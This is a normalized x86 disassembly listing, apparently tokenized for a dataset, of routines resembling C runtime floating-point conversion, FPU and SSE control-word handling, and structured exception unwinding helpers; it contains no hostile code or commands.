mov [ ebp - 0x1c ] edx
mov [ ebp - 0x40 ] esi
push 0x0
pop ebx
test edi edi
jns r-xdata
cmp di [ ebp - 0x54 ]
ja r-xdata
sar [ ebp - 0x44 ] 0x3
add edi 0x54
mov [ ebp - 0x6c ] edi
and eax 0x7
je r-xdata
mov ecx [ ebp - 0x48 ]
jmp r-xdata
movzx edi [ ecx + 0xa ]
mov esi 0x8000
mov eax [ ebp - 0x16 ]
mov [ ebp - 0x5c ] edi
and edi 0x7fff
xor [ ebp - 0x5c ] eax
and eax 0x7fff
and [ ebp - 0x5c ] esi
mov [ ebp - 0x50 ] eax
add eax edi
mov [ ebp - 0x60 ] edi
dec esi
movzx edi ax
mov eax [ ebp - 0x50 ]
cmp ax si
mov esi [ ebp - 0x40 ]
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4c ] edi
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x3c ]
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x68 ] ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
push r--data
push r--data
jmp r-xdata
mov esi [ ebp - 0x74 ]
mov eax [ ebp - 0x48 ]
inc eax
mov [ ebp - 0x54 ] eax
lea edi [ esi + 0x4 ]
mov [ ebp - 0x64 ] edi
mov ecx edi
mov [ ebp - 0x58 ] ecx
test eax eax
jle r-xdata
neg edi
and edi 0xff
jle r-xdata
test cx cx
jne r-xdata
mov [ ebp - 0x18 ] ebx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov edi 0x3fff
shr eax 0x10
cmp ax di
jb r-xdata
xor eax eax
cmp [ ebp - 0x5c ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
mov ecx 0x7fff
cmp [ ebp - 0x60 ] cx
mov ecx [ ebp - 0x68 ]
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_4086c5
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx - 0x1 ]
sub ecx 0x2
cmp al 0x35
jl r-xdata
lea esi [ ebp - 0x20 ]
mov ecx edx
lea edi [ ebp - 0x3c ]
shr ecx 0x1f
movsd [ edi ] [ esi ]
add edx edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp - 0x40 ]
mov eax edi
shr eax 0x1f
add edi edi
or edx eax
mov eax [ ebp - 0x44 ]
lea esi [ eax + eax ]
mov eax edi
or esi ecx
shr eax 0x1f
mov ecx edx
add edi edi
add edx edx
shr ecx 0x1f
or edx eax
add esi esi
mov eax [ ebp - 0x3c ]
or esi ecx
lea ecx [ eax + edi ]
mov [ ebp - 0x48 ] ecx
cmp ecx edi
jb r-xdata
mov ebx [ ebp - 0x44 ]
test ax ax
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
mov esi ebx
mov edx ebx
cmp di [ ebp - 0x70 ]
ja r-xdata
xor eax eax
jmp r-xdata
cmp ecx edi
jae r-xdata
jmp r-xdata
lea eax [ edx + 0x1 ]
mov ecx ebx
cmp eax edx
jb r-xdata
cmp ecx eax
jae r-xdata
mov ecx edx
shr esi 0x1
mov eax ebx
shl ecx 0x1f
shl eax 0x1f
or esi ecx
shr edx 0x1
shr ebx 0x1
or edx eax
dec edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] esi
test edi edi
jg r-xdata
mov [ ebp - 0x44 ] ebx
xor ebx ebx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x40 ] esi
mov edx ebx
lea ecx [ ebp - 0xc ]
push 0x5
mov [ ebp - 0x50 ] edx
pop eax
inc edi
test [ ebp - 0x28 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
test edx edx
jne r-xdata
cmp di [ ebp - 0x54 ]
ja r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp ecx edi
jae r-xdata
cmp ecx edi
jae r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edi [ eax + edx ]
cmp edi edx
jb r-xdata
add ecx 0x2
inc edx
dec eax
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x58 ] eax
test eax eax
jg r-xdata
lea edi [ ebp - 0x20 ]
lea eax [ ebp - 0x28 ]
lea edi [ edi + edx * 2 ]
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x54 ] edi
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
test ax ax
jne r-xdata
mov [ ebp - 0x18 ] ebx
jmp r-xdata
dec ecx
mov eax [ ebp - 0x74 ]
sub cl al
sub cl 0x3
mov [ eax + 0x3 ] cl
movsx ecx cl
mov [ ecx + eax + 0x4 ] bl
xor eax eax
inc eax
mov ecx [ ebp - 0x74 ]
xor eax eax
mov [ ecx ] ax
mov eax 0x8000
cmp [ ebp - 0x80 ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ecx + 0x2 ] al
xor eax eax
inc eax
mov [ ecx + 0x3 ] al
mov [ edi ] 0x30
jmp r-xdata
cmp [ ecx ] 0x39
jne r-xdata
cmp ecx edi
jae r-xdata
inc esi
test ecx ecx
mov edx eax
mov ecx [ ebp - 0x48 ]
je r-xdata
inc esi
cmp edi eax
jae r-xdata
mov esi eax
test eax eax
jle r-xdata
mov edi [ ebp - 0x4c ]
mov esi [ ebp - 0x8 ]
add edi 0xc002
test di di
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp edi edx
jae r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
mov esi ebx
mov edx ebx
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] edx
mov [ ecx + 0x5 ] bl
jmp r-xdata
mov [ ecx ] 0x30
dec ecx
inc [ ecx ]
inc ecx
inc [ esi ]
mov esi [ ebp - 0x74 ]
mov edi [ ebp - 0x64 ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
add esi [ ebp - 0x34 ]
mov eax ecx
mov edx [ ebp - 0x48 ]
mov ecx edi
add edx edx
shr eax 0x1f
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x20 ] edx
lea edx [ edi + edi ]
or edx eax
shr ecx 0x1f
lea eax [ esi + esi ]
mov [ ebp - 0x1c ] edx
or eax ecx
mov ecx [ ebp - 0x58 ]
mov [ ebp - 0x18 ] eax
shr eax 0x18
add al 0x30
mov [ ebp - 0x15 ] bl
mov [ ecx ] al
inc ecx
mov eax [ ebp - 0x54 ]
dec eax
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x54 ] eax
test eax eax
jle r-xdata
mov edx [ ebp - 0x10 ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x68 ] ebx
mov [ ecx - 0x4 ] edi
test eax eax
je r-xdata
mov eax [ ebp - 0x64 ]
push 0x5
mov eax ebx
lea edx [ ebp - 0xc ]
pop esi
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x50 ] esi
inc edi
test [ ecx + 0x8 ] 0x7fffffff
mov [ ebp - 0x4c ] edi
jne r-xdata
test edx edx
jne r-xdata
mov cx [ ebp - 0x10 ]
mov eax edi
neg eax
movzx eax ax
add edi eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4c ] edi
mov edi [ ebp - 0x78 ]
mov [ ebp - 0x68 ] ebx
mov edx [ ebp - 0x68 ]
push 0x0
pop ebx
test di di
jle r-xdata
mov eax [ ebp - 0xc ]
mov edx ebx
mov ecx eax
shr edx 0x1f
add eax eax
shr ecx 0x1f
or eax edx
add esi esi
mov [ ebp - 0xc ] eax
add ebx ebx
mov eax 0xffff
mov [ ebp - 0x10 ] ebx
or esi ecx
add edi eax
mov [ ebp - 0x8 ] esi
test di di
jg r-xdata
mov edi [ ebp - 0x54 ]
mov eax [ ebp - 0x70 ]
add edi 0x2
sub eax 0x2
mov [ ebp - 0x54 ] edi
dec esi
mov [ ebp - 0x70 ] eax
test esi esi
jg r-xdata
inc [ ecx ]
add edx 0x2
inc eax
dec esi
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x50 ] esi
test esi esi
jg r-xdata
lea esi [ ebp - 0x20 ]
lea eax [ esi + eax * 2 ]
lea esi [ ecx + 0x8 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x40 ] esi
mov esi [ ebp - 0x60 ]
mov ecx [ ebp - 0x40 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0xe ]
cmp eax 0xffffffff
jne r-xdata
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov ebx [ ebp - 0xc ]
mov eax esi
mov ecx ebx
shl eax 0x1f
shl ecx 0x1f
shr ebx 0x1
shr edx 0x1
or ebx eax
or edx ecx
shr esi 0x1
dec [ ebp - 0x58 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edx
jne r-xdata
inc edi
mov eax 0xffff
add edi eax
test di di
jns r-xdata
test esi esi
js r-xdata
movzx edx [ eax ]
movzx eax [ edi ]
imul edx eax
mov eax [ ecx - 0x4 ]
mov [ ebp - 0x64 ] ebx
lea edi [ eax + edx ]
cmp edi eax
jb r-xdata
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x60 ] esi
test esi esi
jle r-xdata
mov edi [ ebp - 0x4c ]
mov eax [ ebp - 0x8 ]
add edi 0xc002
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x40 ] eax
test di di
jle r-xdata
xor ecx ecx
inc ecx
jmp r-xdata
cmp eax edi
jae r-xdata
cmp [ ecx ] ebx
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc eax
mov [ ebp - 0xe ] eax
mov eax [ ebp - 0xa ]
mov [ ebp - 0xe ] ebx
cmp eax 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
push 0x0
test edi edi
mov [ ebp - 0x8 ] esi
mov edi [ ebp - 0x4c ]
pop ebx
je r-xdata
mov eax 0xffff
add edi eax
test di di
jns r-xdata
test eax eax
js r-xdata
mov [ edx - 0x4 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x78 ]
mov edi [ ebp - 0x6c ]
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] esi
mov edx [ ebp - 0x1c ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x16 ] di
jmp r-xdata
inc eax
mov [ ebp - 0xa ] eax
mov ax [ ebp - 0x6 ]
mov ecx 0xffff
mov [ ebp - 0xa ] ebx
cmp ax cx
jne r-xdata
xor eax eax
mov cx dx
inc eax
or cx ax
mov [ ebp - 0x10 ] cx
mov edx [ ebp - 0x10 ]
jmp r-xdata
mov ax [ ebp - 0x10 ]
mov ebx [ ebp - 0x40 ]
mov eax edi
neg eax
xor edx edx
movzx eax ax
add edi eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] edi
inc edx
mov edi [ ebp - 0x7c ]
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov edx esi
mov ecx eax
shr edx 0x1f
add eax eax
shr ecx 0x1f
or eax edx
add esi esi
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x10 ] esi
or eax ecx
mov ecx 0xffff
add edi ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x88 ]
mov ecx [ ebp - 0x40 ]
add eax 0x2
sub ecx 0x2
mov [ ebp - 0x88 ] eax
dec esi
mov [ ebp - 0x40 ] ecx
test esi esi
jg r-xdata
inc [ edx ]
inc ax
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov eax 0x8000
inc edi
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov eax 0x8000
cmp cx ax
ja r-xdata
mov eax [ ebp - 0xe ]
cmp eax 0xffffffff
jne r-xdata
and esi 0x1ffff
cmp esi 0x18000
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax ebx
shl eax 0x1f
mov [ ebp - 0x40 ] ecx
shr [ ebp - 0x40 ] 0x1
or [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
shl ecx 0x1f
shr esi 0x1
shr ebx 0x1
or esi ecx
dec [ ebp - 0x50 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] esi
jne r-xdata
inc edi
movzx edi [ eax ]
movzx eax [ ecx ]
imul edi eax
mov eax [ edx - 0x4 ]
mov [ ebp - 0x78 ] ebx
lea ecx [ eax + edi ]
cmp ecx eax
mov [ ebp - 0x60 ] ecx
mov eax ecx
jb r-xdata
mov ecx [ ebp - 0x68 ]
mov esi [ ebp - 0x50 ]
mov eax [ ebp - 0x84 ]
mov esi [ ebp - 0x8 ]
jmp r-xdata
inc eax
mov [ ebp - 0xe ] eax
mov eax [ ebp - 0xa ]
mov [ ebp - 0xe ] ebx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x40 ]
test [ ebp - 0x10 ] dl
je r-xdata
push 0x0
mov [ ebp - 0x40 ] ebx
test edi edi
mov edi [ ebp - 0x4c ]
pop ebx
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1a ] ecx
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x16 ] di
jmp r-xdata
inc eax
mov [ ebp - 0xa ] eax
mov ax [ ebp - 0x6 ]
mov edx 0xffff
mov [ ebp - 0xa ] ebx
cmp ax dx
jne r-xdata
mov ax si
or ax dx
mov [ ebp - 0x10 ] ax
mov esi [ ebp - 0x10 ]
jmp r-xdata
mov [ ebp - 0x40 ] esi
mov eax 0x7fff
cmp di ax
jae r-xdata
inc ax
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov [ ebp - 0x6 ] cx
inc edi
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
sub_40d9a0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
push ebx
push esi
push edi
mov edi 0x200
test cl 0x8
je r-xdata
mov eax 0x80
test cl 0x4
je r-xdata
or eax edi
test cl 0x2
je r-xdata
or eax 0x400
test cl 0x1
je r-xdata
or eax 0x800
mov esi 0x100
test ecx 0x80000
je r-xdata
or eax 0x1000
mov edx ecx
mov ebx 0x300
and edx ebx
je r-xdata
or eax esi
mov edx 0x3000000
pop edi
and ecx edx
pop esi
pop ebx
cmp ecx 0x1000000
je r-xdata
cmp edx esi
je r-xdata
or eax 0x8040
cmp ecx 0x2000000
je r-xdata
or eax 0x2000
cmp edx edi
je r-xdata
or eax 0x40
pop ebp
retn
cmp ecx edx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp edx ebx
jne r-xdata
pop ebp
retn
or eax 0x8000
pop ebp
retn
or eax 0x6000
jmp r-xdata
sub_40da49
push ebp
mov ebp esp
sub esp 0xc
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
xor ecx ecx
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
push ebx
push esi
movzx esi ax
mov ebx 0xc00
mov edx esi
push edi
mov edi 0x200
and edx ebx
je r-xdata
or ecx 0x80000
and esi 0x300
je r-xdata
cmp edx 0x400
je r-xdata
or ecx 0x20000
cmp esi edi
jne r-xdata
or ecx 0x100
cmp edx 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov esi edi
mov eax [ ebp + 0x8 ]
not esi
and esi ecx
and eax edi
or esi eax
cmp esi ecx
je r-xdata
or ecx 0x40000
movzx eax ax
mov edx 0x1000
test edx eax
je r-xdata
or ecx 0x10000
jmp r-xdata
or ecx edi
jmp r-xdata
cmp edx ebx
jne r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
push esi
call sub_40dd4b
movzx eax ax
pop ecx
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
xor esi esi
test al 0x1
je r-xdata
or ecx 0x300
jmp r-xdata
mov eax esi
and edi 0x308031f
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
xor ecx ecx
test al al
jns r-xdata
test al 0x4
je r-xdata
push 0x10
pop esi
test eax 0x200
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or esi 0x8
test eax 0x400
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or esi 0x4
test eax 0x800
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or esi 0x2
test edx eax
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or esi 0x1
test eax 0x100
je r-xdata
or ecx 0x1
movzx edx ax
mov ecx edx
and ecx ebx
je r-xdata
or esi 0x80000
mov edx eax
mov ebx 0x6000
and edx ebx
je r-xdata
or ecx 0x80000
and edx 0x300
je r-xdata
cmp ecx 0x400
je r-xdata
push 0x40
and eax 0x8040
pop ebx
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or esi 0x20000
cmp edx 0x200
jne r-xdata
or esi 0x100
cmp ecx 0x800
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or esi 0x40000
mov edx 0x1000
test edx eax
je r-xdata
or esi 0x10000
jmp r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov eax ecx
or ecx esi
xor eax esi
test eax 0x8031f
je r-xdata
push eax
call sub_40d9a0
push eax
mov [ ebp + 0xc ] eax
call sub_40dde2
pop ecx
pop ecx
stmxcsr [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
xor ecx ecx
test al al
jns r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx ebx
jne r-xdata
or esi 0x300
jmp r-xdata
mov eax ecx
jmp r-xdata
or ecx 0x80000000
test eax 0x200
je r-xdata
push 0x10
pop ecx
mov eax edi
and edi [ ebp + 0x8 ]
not eax
and eax ecx
or eax edi
cmp eax ecx
je r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax 0x400
je r-xdata
or ecx 0x8
test eax 0x800
je r-xdata
or ecx 0x4
test eax 0x1000
je r-xdata
or ecx 0x2
test eax 0x100
je r-xdata
or ecx 0x1
mov edx eax
mov edi 0x6000
and edx edi
je r-xdata
or ecx 0x80000
and eax 0x8040
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx edi
jne r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
sub_40dd4b
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
inc eax
test cl 0x4
je r-xdata
or eax 0x4
test cl 0x2
je r-xdata
or eax 0x8
test cl 0x1
je r-xdata
or eax 0x10
test ecx 0x80000
je r-xdata
or eax 0x20
push esi
mov edx ecx
mov esi 0x300
push edi
mov edi 0x200
and edx esi
je r-xdata
or eax 0x2
mov edx ecx
and edx 0x30000
je r-xdata
cmp edx 0x100
je r-xdata
or eax esi
cmp edx 0x10000
jne r-xdata
or eax 0x400
cmp edx edi
je r-xdata
pop ebp
retn
or eax 0x1000
pop edi
pop esi
test ecx 0x40000
je r-xdata
or eax edi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp edx esi
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_40dde2
push 0x8
push r--data
call sub_4021d0
cmp [ rw-data ] 0x1
jl r-xdata
call sub_402215
retn
mov eax [ ebp + 0x8 ]
test al 0x40
je r-xdata
and eax 0xffffffbf
mov [ ebp + 0x8 ] eax
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_40de64
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40174b
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_40ef1d
add esp 0x20
pop esi
pop ebp
retn
sub_40de95
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40174b
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_40ef1d
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_40df9b
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40e122
pop ebx
mov esp ebp
pop ebp
retn
sub_40df34
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
lea ecx [ ebp - 0x18 ]
and [ ebp - 0x18 ] 0x0
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_40de64
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40e250
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov esp ebp
pop ebp
retn
sub_40df9b
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_40de95
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_40638a
mov eax [ eax + 0x80 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x8 ]
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
sub_40e072
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ eax + 0xc ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] esi
push edi
mov edi esi
test ebx ebx
js r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] edi
mov eax [ ebp + 0x8 ]
cmp edi [ eax + 0xc ]
ja r-xdata
mov edx [ ebp + 0x10 ]
call sub_403520
cmp esi edi
jbe r-xdata
dec esi
imul eax esi 0x14
cmp [ eax + ecx + 0x4 ] edx
jge r-xdata
call sub_403520
imul eax esi 0x14
pop edi
pop esi
pop ebx
add eax ecx
mov esp ebp
pop ebp
retn
cmp esi 0xffffffff
jne r-xdata
cmp edx [ eax + ecx + 0x8 ]
jle r-xdata
test ebx ebx
jns r-xdata
mov edi [ ebp - 0x4 ]
dec ebx
mov [ ebp - 0x4 ] esi
cmp esi 0xffffffff
jne r-xdata
sub_40e0f0
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_40e122
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40e177
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_40638a
mov ecx [ eax + 0x98 ]
mov [ esi + 0x4 ] ecx
call sub_40638a
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_40e1a1
push ebp
mov ebp esp
push esi
call sub_40638a
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_40638a
mov ecx [ eax + 0x98 ]
jmp r-xdata
call sub_40638a
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebp
jmp sub_403520
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
pop esi
pop ebp
retn
sub_40e1f1
push ebp
mov ebp esp
call sub_40638a
mov eax [ eax + 0x98 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_40e21a
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ef1d
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
